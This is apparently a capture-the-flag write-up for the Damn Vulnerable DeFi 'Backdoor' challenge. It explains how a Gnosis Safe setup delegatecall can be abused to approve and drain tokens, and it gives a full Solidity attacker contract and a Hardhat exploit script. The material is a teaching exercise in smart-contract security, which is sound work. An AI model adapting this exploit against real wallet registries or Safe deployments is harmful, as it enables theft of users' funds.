---
description: Make sure you take enough time to understand each contract!
---

# 11 - Backdoor

```javascript
// Deploy Gnosis Safe master copy and factory contracts
this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
```

We first deploy 3 contracts: **`GnosisSafe`**, **`GnosisSafeProxyFactory`**, **`DamnValuableToken`**.

```javascript
// Deploy the registry
this.walletRegistry = await (
  await ethers.getContractFactory('WalletRegistry', deployer)
).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users);
```

Then we deploy **`WalletRegistry`** contract which is provided from this challenge.



Let's see what's the success condition.

```javascript
/** SUCCESS CONDITIONS */
for (let i = 0; i < users.length; i++) {
  let wallet = await this.walletRegistry.wallets(users[i]);

  // User must have registered a wallet
  expect(wallet).to.not.eq(ethers.constants.AddressZero, 'User did not register a wallet');

  // User is no longer registered as a beneficiary
  expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false;
}

// Attacker must have taken all tokens
expect(await this.token.balanceOf(attacker.address)).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
```

1\) User must have a registered wallet

2\) User should no longer be registered as a beneficiary

3\) Attacker must take all `40 DVT`s.



## Solution

We will exploit the contract in the following order:

1. Attacker contract calls `createProxyWithCallback` in **`GnosisSafeProxyFactory`**
2. `createProxyWithCallback` will call `createProxyWithNonce`&#x20;
3. `createProxyWithNonce` calls `deployProxyWithNonce`&#x20;
4. `createProxyWithNonce` sends `initializer` to newly create proxy\
   \-> here, initializer will trigger `setup` function
5. createProxyWithCallback calls callback(`proxyCreated`) \
   \-> `10 DVT`s will be transfered from **`WalletRegistry`** to each user's proxy contract

```solidity
/// @dev Setup function sets initial storage of contract.
/// @param _owners List of Safe owners.
/// @param _threshold Number of required confirmations for a Safe transaction.
/// @param to Contract address for optional delegate call.
/// @param data Data payload for optional delegate call.
/// @param fallbackHandler Handler for fallback calls to this contract
/// @param paymentToken Token that should be used for the payment (0 is ETH)
/// @param payment Value that should be paid
/// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to, // Our malicious contract address
    bytes calldata data, // abi.encodeWithSignature("maliciousApprove(address)"
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external {
    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
    setupOwners(_owners, _threshold);
    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
    setupModules(to, data);

    if (payment > 0) {
        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
        // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
    }
    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
}
```

This is the setup function that is triggered by `initializer` sent from `createProxyWithNonce` (at **4.**)



```solidity
function setupModules(address to, bytes memory data) internal {
    require(modules[SENTINEL_MODULES] == address(0), "GS100");
    modules[SENTINEL_MODULES] = SENTINEL_MODULES;
    if (to != address(0))
        // Setup has to complete successfully or transaction fails.
        require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
}
```

Here, setupModules delegatecalls to the address to.

So we will pass in our malicious contract address to `setupModules` function.



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";

contract AttackWalletRegistry {
    // Note that these variables are declared as immutable
    // so these can be read even when this contracted is delegatecalled
    address immutable mastercopy;
    address immutable proxyFactory;
    address immutable walletRegistry;
    DamnValuableToken immutable dvt;

    constructor(
        address _mastercopy,
        address _walletFactory,
        address _walletRegistry,
        DamnValuableToken _dvt
    ) {
        mastercopy = _mastercopy;
        proxyFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        dvt = _dvt;
    }
    
    // this function will be called via delegatecall from GnosisSafe.setupModule
    function maliciousApprove(address _spender) external {
        IERC20(dvt).approve(_spender, 10 ether);
    }

    function attack(address[] calldata _beneficiaries) external {
        for (uint256 i = 0; i < 4; i++) {
            console.log(i);
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];
            
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                beneficiary,
                1,
                address(this),
                abi.encodeWithSignature("maliciousApprove(address)", address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(proxyFactory).createProxyWithCallback(
                mastercopy,
                initializer,
                i, // can ba any value
                IProxyCreationCallback(walletRegistry)
            );
            
            // move 10 DVTs that we maliciously approved using delegatecall
            dvt.transferFrom(address(newProxy), msg.sender, 10 ether);
        }
    }
}

```

```javascript
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackWalletRegistryFactory = await ethers.getContractFactory('AttackWalletRegistry');
  const attackWalletRegistry = await AttackWalletRegistryFactory.deploy(
    this.masterCopy.address,
    this.walletFactory.address,
    this.walletRegistry.address,
    this.token.address
  );
  await attackWalletRegistry.deployed();

  await (await attackWalletRegistry.connect(attacker).attack(users)).wait();
});
```
